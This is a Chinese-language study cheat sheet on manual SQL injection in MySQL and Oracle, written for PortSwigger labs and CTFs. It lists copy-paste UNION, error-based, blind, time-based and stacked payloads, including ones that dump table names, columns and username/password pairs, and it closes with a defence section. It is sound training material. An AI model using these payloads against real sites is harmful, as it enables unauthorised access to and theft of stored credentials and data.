# MySQL & Oracle 手工 SQL 注入 整合完整版手册

> 适用：PortSwigger 靶场、CTF 手工注入
> 
> Payload 全部为**原始文本，直接粘贴进 Burp Repeater 参数 value 框，不用手动 URL 编码**
> 
> 核心原理两者完全一致：**用户可控输入直接拼接进 SQL 字符串，未使用预编译，导致注入**
> 
> 预编译局限：只能防护 WHERE 条件里的值；**ORDER BY/GROUP BY 这类 SQL 结构拼接，预编译无效，只能白名单**

---

## 一、系统元数据映射（最重要！）


| 功能            | MySQL                        | Oracle                                 | 备注                                                                              |
| ------------- | ---------------------------- | -------------------------------------- | ------------------------------------------------------------------------------- |
| 查询所有表         | `information_schema.tables`  | `all_tables` / `user_tables`           | `user_tables`只看当前用户自己的表，注入优先用；`all_tables`能看当前用户有权限访问的所有表；`dba_tables`需要 DBA 权限 |
| 查询所有列         | `information_schema.columns` | `all_tab_columns` / `user_tab_columns` | 视图里的字段名都叫`table_name`、`column_name`，只是存放位置不同                                    |
| 筛选当前库 /schema | `table_schema=database()`    | `owner=USER`                           | MySQL 叫数据库；Oracle 叫 Schema (用户)                                                 |

> 记忆口诀：
> 
> MySQL：查表、列都在`information_schema`里面
> 
> Oracle：没有`information_schema`，用`user_tables`/`user_tab_columns`（优先）

---

## 二、基础语法 & 注入常用函数对比


![[Pasted image 20261015210139.png|700]]


### 关键名词解释

1. **dual**：Oracle 虚拟伪表，只有一行空数据。Oracle 语法强制 SELECT 必须带 FROM，查常量、函数结果没有真实表时，用`FROM dual`占位。
2. **ROWNUM**：Oracle 伪列，不是表真实字段。查询输出结果之后，按顺序给每行分配编号，从 1 开始。只能直接用`ROWNUM=1`获取第一条。
3. **LISTAGG**：Oracle 聚合函数，把多条查询结果合并为一行字符串，自定义分隔符。靶场表少的时候，一次性爆出全部表 / 列。超过 4000 字符失效，改用`ROWNUM+NOT IN`逐行获取。

---

## 三、注入通用流程（MySQL、Oracle 一样）

1. 找注入点：输入单引号`'`，观察页面是否报错
2. `ORDER BY` 猜查询返回的列数量
3. UNION SELECT，匹配**列数量**和**列数据类型**
4. 查询版本 → 查询表名 → 查询列名 → 查询表内数据

> 下面 Payload 统一场景：原始查询返回 2 列，注入点 category，原始 SQL：`SELECT name,description FROM products WHERE category='$cat' AND released=1`

###  UNION 联合注入（有回显，优先使用）

#### MySQL Payload

plaintext

```
' UNION SELECT VERSION(),DATABASE() -- 
```

一次性爆全部表

plaintext

```
' UNION SELECT GROUP_CONCAT(table_name,':'),null FROM information_schema.tables WHERE table_schema=DATABASE() -- 
```

一次性爆目标表所有列（假设表 users）

plaintext

```
' UNION SELECT GROUP_CONCAT(column_name,':'),null FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users' -- 
```

读取数据

plaintext

```
' UNION SELECT username,password FROM users LIMIT 0,1 -- 
```

#### Oracle Payload（PortSwigger 靶场直接复制）

测试 dual，验证 UNION 是否通


```
Gifts' UNION SELECT 'test123',null FROM dual -- 
```

查询版本


```
Gifts' UNION SELECT banner,null FROM v$version -- 
```

一次性爆出当前用户全部表（listagg 推荐）


```
Gifts' UNION SELECT listagg(table_name,':') within group (order by table_name),null FROM user_tables -- 
```

一次性爆出目标表所有列（假设表 USERS，大写）


```
Gifts' UNION SELECT listagg(column_name,':') within group (order by column_name),null FROM user_tab_columns WHERE table_name='USERS' -- 
```

读取表内数据


```
Gifts' UNION SELECT USERNAME,PASSWORD FROM USERS WHERE ROWNUM=1 -- 
```

##### listagg 失效备选：逐行获取（ROWNUM + NOT IN）

拿第一张表


```
Gifts' UNION SELECT table_name,null FROM user_tables WHERE ROWNUM=1 -- 
```

拿到第一张表（例：PRODUCTS），填入 NOT IN，拿第二张


```
Gifts' UNION SELECT table_name,null FROM user_tables WHERE ROWNUM=1 AND table_name NOT IN ('PRODUCTS') -- 
```

原理：剔除已经获取到的数据，剩下结果集再取第一条，绕开`ROWNUM!=2`的限制。

---

## 四、其他注入类型 Payload

### 1. 报错注入

MySQL


```
' AND updatexml(1,concat(0x7e,VERSION(),0x7e),1) -- 
```

Oracle（环境依赖，经常失效）


```
' AND utl_inaddr.get_host_name((SELECT table_name FROM user_tables WHERE ROWNUM=1)) -- 
```

### 2. 布尔盲注（页面只有正常 / 空白两种状态，无回显）

MySQL


```
' AND SUBSTRING(DATABASE(),1,1)='a' -- 
```

Oracle


```
' AND SUBSTR(USER,1,1)='S' AND ROWNUM=1 -- 
```

> Oracle 截取函数：`SUBSTR(字符串,起始位置,长度)`

### 3. 时间盲注（页面无任何差异，依靠延时判断真假）

MySQL


```
' AND IF(SUBSTRING(DATABASE(),1,1)='a',SLEEP(5),1) -- 
```

Oracle


```
' AND (CASE WHEN SUBSTR(USER,1,1)='S' THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END) AND ROWNUM=1 -- 
```

### 4. 堆叠注入

MySQL 可用，Oracle 完全无效


```
';INSERT INTO users VALUES('test','123456'); -- 
```

---

## 五、防御方案（MySQL、Oracle 通用）

1. **首选：参数化预编译 PreparedStatement**
    
     防护 WHERE 子句参数值注入
    
     **无法防御 ORDER BY、GROUP BY 这类 SQL 结构拼接，结构类只能白名单**
1. 最小权限原则：数据库账号只分配业务必需权限，不要 DBA 管理员权限
2. 输入校验：白名单 > 黑名单，黑名单容易绕过
3. 禁用危险函数 / 包
    
    - MySQL：限制`secure_file_priv`，禁止`into outfile`写文件
    - Oracle：配置 ACL，禁用`utl_inaddr`、`utl_http`
    
4. 转义函数仅作为辅助防护，存在宽字节注入等绕过方式，不能单独防御注入
5. WAF 属于辅助防护，存在大量绕过手段，不能单独依赖

---

## 六、高频坑点汇总

### Oracle 坑

1. 常量查询必须写`FROM dual`，直接`SELECT 'xxx'`语法报错
2. `ROWNUM=2`直接查询永远为空；listagg 超长报错才用`ROWNUM+NOT IN`循环爆数据
3. UNION 列类型必须严格匹配，不确定就用 null 占位
4. 表名字典内大写，匹配时引号内必须大写
5. 注释不能用`#`，只能`--` 或者`/* */`
6. 不支持堆叠注入，分号`;`不能执行第二条 SQL
7. 优先使用`user_tables`/`user_tab_columns`，减少无关数据干扰

### MySQL 坑

1. `GROUP_CONCAT`有长度上限，过长会截断
2. `||`不是字符串拼接，要用`CONCAT()`
3. `LIMIT m,n`：跳过 m 行，取 n 行

---

## 七、最简实操顺序（PortSwigger Oracle Lab）

1. `ORDER BY` 判断列数
2. `Gifts' UNION SELECT 'test123',null FROM dual --` 验证 UNION 注入
3. listagg 一次性拿全部表名
4. listagg 拿目标表全部列名
5. UNION SELECT 列 1, 列 2 FROM 目标表 WHERE ROWNUM=1 -- 读取账号密码